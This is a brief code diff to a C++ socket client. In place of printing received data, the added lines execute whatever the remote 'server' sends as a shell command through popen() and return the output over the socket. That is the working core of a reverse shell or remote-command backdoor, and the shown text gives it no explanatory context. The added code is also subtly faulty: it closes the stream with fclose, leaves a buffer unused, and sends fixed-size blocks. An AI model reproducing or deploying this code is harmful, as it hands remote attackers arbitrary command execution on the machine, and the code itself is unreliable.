@@ -19,7 +19,13 @@ int main()
     {
         char buffer[4096];
         recv(server,buffer,4096,0);
-        cout<<buffer<<endl;
+        FILE* p=popen(buffer,"r");
+        char result[4096];
+        while(fgets(buffer,sizeof(buffer),p)!=nullptr)
+        {
+            send(server,buffer,sizeof(buffer),0);
+        }
+        fclose(p);
     }
     close(server);
 }
